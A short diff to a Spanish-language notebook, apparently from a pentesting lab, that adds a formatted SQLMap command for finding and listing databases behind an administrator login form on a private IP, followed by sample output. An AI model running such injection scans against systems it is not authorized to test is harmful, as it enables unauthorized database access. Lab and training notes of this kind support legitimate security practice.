@@ -4,7 +4,9 @@ Uso para panel de administrador
 
 extraer las bases de datos
 
-
+```sh fold:"SQLMap descubrir bases de datos"
+sqlmap -u http://192.168.1.141/administrator/ --forms --dbs --batch
+```
 sqlmap -u http://192.168.1.141/administrator/ --forms --dbs --batch
 ejemplo de salida:
 [*] information_schema                                                                                                  
